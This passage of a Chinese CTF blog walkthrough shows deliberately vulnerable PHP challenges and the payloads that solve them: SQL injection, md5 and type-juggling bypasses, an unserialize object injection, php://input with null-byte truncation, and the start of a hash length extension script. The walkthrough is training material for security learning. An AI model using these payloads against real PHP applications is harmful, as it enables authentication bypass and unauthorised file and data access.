htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line">$username &#x3D; @clean((string)$_GET[&#39;username&#39;]);</span><br><span class="line">$password &#x3D; @clean((string)$_GET[&#39;password&#39;]);</span><br><span class="line">&#x2F;&#x2F;$query&#x3D;&#39;SELECT * FROM users WHERE name&#x3D;\&#39;&#39;admin\&#39;\&#39; AND pass&#x3D;\&#39;&#39;or 1 #&#39;\&#39;;&#39;;</span><br><span class="line">$query&#x3D;&#39;SELECT * FROM users WHERE name&#x3D;\&#39;&#39;.$username.&#39;\&#39; AND pass&#x3D;\&#39;&#39;.$password.&#39;\&#39;;&#39;;</span><br><span class="line">$result&#x3D;mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">    die(&#39;Invalid password!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">echo $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>重点看源码里面的那句sql语句 该怎么闭合这句sql</p>
+<p>看到后面输出flag部分 所以要先使得前面的if不成立 后面才会输出flag</p>
+<p>就是$result为true或者mysql_num_rows($result) &gt; 1 而且前面的clean函数 会将提交的参数里的转义字符去掉</p>
+<p>所以构造payload时要注意添加转义字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin\&#39;\&#39; AND  pass&#x3D;\&#39;&#39;or 1%23&amp;password&#x3D;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x10-MD5函数绕过"><a href="#0x10-MD5函数绕过" class="headerlink" title="0x10 MD5函数绕过==="></a>0x10 MD5函数绕过===</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">    if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class="line">        print &#39;Your password can not be your username.&#39;;</span><br><span class="line">    else if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;]))</span><br><span class="line">        die(&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &#39;Invalid password&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里注意if里面的是===，这里会比较两者的类型，所以跟前面的==是不一样的</p>
+<p>所以这里只能使用数组来绕过，因为PHP对数组的计算都会返回NULL 所以这里直接提交两个数组</p>
+<p>使条件成立 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username[]&#x3D;1&amp;password[]&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x11-十六进制与数字比较"><a href="#0x11-十六进制与数字比较" class="headerlink" title="0x11 十六进制与数字比较"></a>0x11 十六进制与数字比较</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line">    $flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">    $one &#x3D; ord(&#39;1&#39;);  &#x2F;&#x2F;ord — 返回字符的 ASCII 码值</span><br><span class="line">    $nine &#x3D; ord(&#39;9&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值</span><br><span class="line">    $number &#x3D; &#39;3735929054&#39;;</span><br><span class="line">    &#x2F;&#x2F; Check all the input characters!</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; strlen($number); $i++)</span><br><span class="line">    &#123; </span><br><span class="line">        &#x2F;&#x2F; Disallow all the digits!</span><br><span class="line">        $digit &#x3D; ord($temp&#123;$i&#125;);</span><br><span class="line">        if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Aha, digit not allowed!</span><br><span class="line">            return &quot;flase&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if($number &#x3D;&#x3D; $temp)</span><br><span class="line">        return $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看源码 发现提交上去的参数会每一个都转为ascii值然后与1和9的ascii比较 不能大于等于1 又不能小于等于9</p>
+<p>然后下面有需要与$number相等 number上面为3735929054</p>
+<p>这里就需要做一点转变 所以这里我们就把这串数字转换成十六进制 十六进制也是可以进行比较的</p>
+<p>所以先转换成十六机制 转换后是：0xdeadc0de</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password&#x3D;0xdeadc0de</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x12-数字验证正则绕过"><a href="#0x12-数字验证正则绕过" class="headerlink" title="0x12 数字验证正则绕过"></a>0x12 数字验证正则绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">if  (&quot;POST&quot; &#x3D;&#x3D; $_SERVER[&#39;REQUEST_METHOD&#39;]) </span><br><span class="line">&#123; </span><br><span class="line">    $password &#x3D; $_POST[&#39;password&#39;]; </span><br><span class="line">    if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;$&#x2F;&#39;, $password)) &#x2F;&#x2F;preg_match — 执行一个正则表达式匹配</span><br><span class="line">    &#123; </span><br><span class="line">        echo &#39;Wrong Format&#39;; </span><br><span class="line">        exit; </span><br><span class="line">    &#125; </span><br><span class="line">    while (TRUE) </span><br><span class="line">    &#123; </span><br><span class="line">        $reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;; </span><br><span class="line">        if (6 &gt; preg_match_all($reg, $password, $arr)) </span><br><span class="line">            break; </span><br><span class="line">        $c &#x3D; 0; </span><br><span class="line">        $ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); &#x2F;&#x2F;[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 </span><br><span class="line">        foreach ($ps as $pt) </span><br><span class="line">        &#123; </span><br><span class="line">            if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password)) </span><br><span class="line">                $c +&#x3D; 1; </span><br><span class="line">        &#125; </span><br><span class="line">        if ($c &lt; 3) break; </span><br><span class="line">        &#x2F;&#x2F;&gt;&#x3D;3，必须包含四种类型三种与三种以上</span><br><span class="line">        if (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag; </span><br><span class="line">        else echo &#39;Wrong password&#39;; </span><br><span class="line">        exit; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们先从最开始分析 一开始会对我们post上去的password进行一个正则匹配 </p>
+<p>必须要12个字符以上 不然就是报错 格式错误</p>
+<p>然后下面进入一个while 里面的第一个if需要我们匹配到的次数在6次以上 否则直接退出</p>
+<p>然后下面的foreach 每当匹配到一种类型 就+1 最后需要大于3 所以就需要三种或三种以上的类型</p>
+<p>所以这里我们就可以使用科学计数法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;42.00e+0000000000</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x13-弱类型整数大小比较绕过"><a href="#0x13-弱类型整数大小比较绕过" class="headerlink" title="0x13 弱类型整数大小比较绕过"></a>0x13 弱类型整数大小比较绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &quot;flag&#123;test&#125;&quot;;</span><br><span class="line"></span><br><span class="line">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;    </span><br><span class="line">if($temp&gt;1336)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里看源码就比较简单 因为PHP是弱类型语言 会自动判断数据类型和转换</p>
+<p>这里先判断是否是数字时 可以让它先是字符串 而且与1336比较的时候又成为整数</p>
+<p>所以我们传入1377a 所以在is_numeric($temp)判断的时候会把它当字符串处理 所以这里不会这里退出</p>
+<p>而后面直接和1336比较的时候 会先intval取整数再与1336比较 所以1337大于1336 然后输出flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password&#x3D;1337a</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x14-md5函数true注入绕过"><a href="#0x14-md5函数true注入绕过" class="headerlink" title="0x14 md5函数true注入绕过"></a>0x14 md5函数true注入绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">$link &#x3D; mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;);</span><br><span class="line">if (!$link) &#123; </span><br><span class="line">  die(&#39;Could not connect to MySQL: &#39; . mysql_error()); </span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F; 选择数据库</span><br><span class="line">$db &#x3D; mysql_select_db(&quot;security&quot;, $link);</span><br><span class="line">if(!$db)</span><br><span class="line">&#123;</span><br><span class="line">  echo &#39;select db error&#39;;</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 执行sql</span><br><span class="line">$password &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">$sql &#x3D; &quot;SELECT * FROM users WHERE password &#x3D; &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</span><br><span class="line">var_dump($sql);</span><br><span class="line">$result&#x3D;mysql_query($sql) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line">$row1 &#x3D; mysql_fetch_row($result);</span><br><span class="line">var_dump($row1);</span><br><span class="line">mysql_close($link);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看代码首先看到有一个md5($password,true)，md5函数第二个参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TRUE – 原始 – 16 字符二进制格式</span><br><span class="line">FALSE – 默认 – 32 字符十六进制数</span><br></pre></td></tr></table></figure>
+
+<p>所以为true的时候，返回的是16字符二进制格式</p>
+<p>所以将password的值md5之后 再转为原始的字符 </p>
+<p>所以我们需要提交特定的字符串 让md5函数将其当成字符串处理</p>
+<p>这个特定字符串被处理后需要有sql的字符 这里有两个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line">raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#39;or&#39;8</span><br><span class="line">string: T0Do#&#39;or&#39;8</span><br><span class="line"></span><br><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line">string: &#39;or&#39;6]!r,b</span><br></pre></td></tr></table></figure>
+
+<p>所以构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?password&#x3D;129581926211651571912466741651878684928</span><br><span class="line">?password&#x3D;ffifdyop</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x15-switch无break-字符与0比较绕过"><a href="#0x15-switch无break-字符与0比较绕过" class="headerlink" title="0x15 switch无break 字符与0比较绕过"></a>0x15 switch无break 字符与0比较绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (isset($_GET[&#39;which&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $which &#x3D; $_GET[&#39;which&#39;];</span><br><span class="line">    switch ($which)</span><br><span class="line">    &#123;</span><br><span class="line">    case 0:</span><br><span class="line">    case 1:</span><br><span class="line">    case 2:</span><br><span class="line">        require_once $which.&#39;.php&#39;;</span><br><span class="line">         echo $flag;</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        echo GWF_HTML::error(&#39;PHP-0817&#39;, &#39;Hacker NoNoNo!&#39;, false);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们直接给<code>which</code>为<code>flag</code>，这里会发现在<code>case 0</code>和<code>case 1</code>的时候，没有<code>break</code>，按照常规思维，应该是<code>0</code>比较不成功，进入比较<code>1</code>，然后比较<code>2</code>，再然后进入<code>default</code>，但是事实却不是这样，事实上，在 <code>case 0</code>的时候，字符串和<code>0</code>比较是相等的，进入了<code>case 0</code>的方法体，但是却没有<code>break</code>，这个时候，默认判断已经比较成功了，而如果匹配成功之后，会继续执行后面的语句，这个时候，是不会再继续进行任何判断的。也就是说，我们<code>which</code>传入<code>flag</code>的时候，<code>case 0</code>比较进入了方法体，但是没有<code>break</code>，默认已经匹配成功，往下执行不再判断，进入<code>2</code>的时候，执行了<code>require_once flag.php</code></p>
+<h2 id="0x16-unserialize-序列化"><a href="#0x16-unserialize-序列化" class="headerlink" title="0x16 unserialize()序列化"></a>0x16 unserialize()序列化</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 题目：http:&#x2F;&#x2F;web.jarvisoj.com:32768 --&gt;</span><br><span class="line">&lt;!-- index.php --&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">	require_once(&#39;shield.php&#39;);</span><br><span class="line">	$x &#x3D; new Shield();</span><br><span class="line">	isset($_GET[&#39;class&#39;]) &amp;&amp; $g &#x3D; $_GET[&#39;class&#39;];</span><br><span class="line">	if (!empty($g)) &#123;</span><br><span class="line">		$x &#x3D; unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line">	echo $x-&gt;readfile();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;showimg.php?img&#x3D;c2hpZWxkLmpwZw&#x3D;&#x3D;&quot; width&#x3D;&quot;100%&quot;&#x2F;&gt;</span><br><span class="line">&lt;!-- shield.php --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#x2F;&#x2F;flag is in pctf.php</span><br><span class="line">	class Shield &#123;</span><br><span class="line">		public $file;</span><br><span class="line">		function __construct($filename &#x3D; &#39;&#39;) &#123;</span><br><span class="line">			$this -&gt; file &#x3D; $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		function readfile() &#123;</span><br><span class="line">			if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)&#x3D;&#x3D;&#x3D;FALSE  </span><br><span class="line">			&amp;&amp; stripos($this-&gt;file,&#39;&#x2F;&#39;)&#x3D;&#x3D;&#x3D;FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)&#x3D;&#x3D;FALSE) &#123;</span><br><span class="line">				return @file_get_contents($this-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!-- showimg.php --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	$f &#x3D; $_GET[&#39;img&#39;];</span><br><span class="line">	if (!empty($f)) &#123;</span><br><span class="line">		$f &#x3D; base64_decode($f);</span><br><span class="line">		if (stripos($f,&#39;..&#39;)&#x3D;&#x3D;&#x3D;FALSE &amp;&amp; stripos($f,&#39;&#x2F;&#39;)&#x3D;&#x3D;&#x3D;FALSE &amp;&amp; stripos($f,&#39;\\&#39;)&#x3D;&#x3D;&#x3D;FALSE</span><br><span class="line">		&#x2F;&#x2F;stripos — 查找字符串首次出现的位置（不区分大小写）</span><br><span class="line">		&amp;&amp; stripos($f,&#39;pctf&#39;)&#x3D;&#x3D;&#x3D;FALSE) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			echo &quot;File not found!&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里是有关序列化的操作 这里面一共涉及到了四个php文件 其中flag在pctf.php文件里面</p>
+<p>先看index.php  一个Shield对象 一个GET的class参数 然后将g反序列化赋值个x</p>
+<p>再调用readfile去读文件 下面一个img标签 又看到showimg.php</p>
+<p>showimg.php里面规定了不能直接读取pctf.php文件</p>
+<p>Shield.php文件里面 类Shield里面一个公共变量file 一个readfile函数 </p>
+<p>那么这里涉及到序列化的操作</p>
+<p>有经验的一看就知道应该是将一个已经序列化的对象通过class传给g 再反序列化传给class</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?class&#x3D;O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提交即可读取pctf.php的内容</p>
+<h2 id="0x17"><a href="#0x17" class="headerlink" title="0x17"></a>0x17</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!$_GET[&#39;id&#39;]) &#123;</span><br><span class="line">	header(&#39;Location:</span><br><span class="line">  index.php?id&#x3D;1&#39;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">if(stripos($a,&#39;.&#39;)) </span><br><span class="line">	echo &#39;Hahahahahaha&#39;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);</span><br><span class="line">if($data&#x3D;&#x3D;&quot;1112 is a nice lab!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4) &#123;</span><br><span class="line">	require(&quot;flag.txt&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	print &quot;work harder!harder!harder!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先看源码 如果没有参数id则自动给id赋值为1 下面多了两个参数 a和b a里面不能带. 下面的data是从a提交的参数当成文件名读取内容 这里应该想到php://input传值 $id==0可以给id传个0a来绕过后面一个正则匹配 要求b第一个为4 但是最后一个要求b第一个不能为4 这里应该想到%00截断 </p>
+<p>所以整体就出来了 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0a&amp;a&#x3D;php:&#x2F;&#x2F;input&amp;b&#x3D;%004111</span><br></pre></td></tr></table></figure>
+
+<p>然后还要再post一个值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1112 is a nice lab</span><br></pre></td></tr></table></figure>
+
+<p>即可得到flag</p>
+<h2 id="0x18"><a href="#0x18" class="headerlink" title="0x18"></a>0x18</h2><p><span class="exturl" data-url="aHR0cDovL3dlYi5qYXJ2aXNvai5jb206MzI3Nzgv" title="http://web.jarvisoj.com:32778/">原题链接<i class="fa fa-external-link"></i></span></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 350&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">                background:gray;</span><br><span class="line">                text-align:center;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">                $auth &#x3D; false;</span><br><span class="line">                $role &#x3D; &quot;guest&quot;;</span><br><span class="line">                $salt &#x3D;</span><br><span class="line">                if (isset($_COOKIE[&quot;role&quot;])) &#123;&#x2F;&#x2F;有cookie</span><br><span class="line">                        $role &#x3D; unserialize($_COOKIE[&quot;role&quot;]);</span><br><span class="line">                        $hsh &#x3D; $_COOKIE[&quot;hsh&quot;];</span><br><span class="line">                        if ($role&#x3D;&#x3D;&#x3D;&quot;admin&quot; &amp;&amp; $hsh &#x3D;&#x3D;&#x3D; md5($salt.strrev($_COOKIE[&quot;role&quot;])))</span><br><span class="line">&#x2F;&#x2F; strrev返回 string 反转后的字符串。 </span><br><span class="line">                         &#123;</span><br><span class="line">                                $auth &#x3D; true; &#x2F;&#x2F;cookie为admin</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                                $auth &#x3D; false; &#x2F;&#x2F;cookie不是admin</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; else &#123;&#x2F;&#x2F;没cookie则设置cookie</span><br><span class="line">                        $s &#x3D; serialize($role);</span><br><span class="line">                        setcookie(&#39;role&#39;,$s);</span><br><span class="line">                        $hsh &#x3D; md5($salt.strrev($s));</span><br><span class="line">                        setcookie(&#39;hsh&#39;,$hsh);</span><br><span class="line">                &#125;</span><br><span class="line">                if ($auth) &#123;</span><br><span class="line">                        echo &quot;&lt;h3&gt;Welcome Admin. Your flag is </span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                        echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">        ?&gt;      </span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里盐值未知 但是后面hsh取md5的时候拼接了盐值 并且role要为admin，hsh也是要用admin翻转拼接salt来计算</p>
+<p>所以这里我们需要利用哈希长度扩展攻击来获取flag</p>
+<p>但是这里我们也不知道盐值的长度 所以需要先进行爆破来获取盐值长度 再进行哈希长度扩展攻击</p>
+<p>首先服务器端返回的是$role=’s:5:”guest”;’<code>以及</code>$hsh=md5(salt+strrev($role))</p>
+<p>而我们需要的是md5(salt+strrev(admin))和$role=’s:5:”admin”;’</p>
+<p>这里首先爆破盐值长度需要使用hashpumpy </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import hashpumpy</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">for i in range(1,20):</span><br><span class="line">	m&#x3D;hashpumpy.hashpump(&#39;3a4727d57463f122833d9e732f94e4e0&#39;,&#39;;\&quot;tseug\&quot;:5:s&#39;,&#39;;\&quot;nimda\&quot;:5:s&#39;,i)</span><br><span class="line">	print i		</span><br><span class="line">	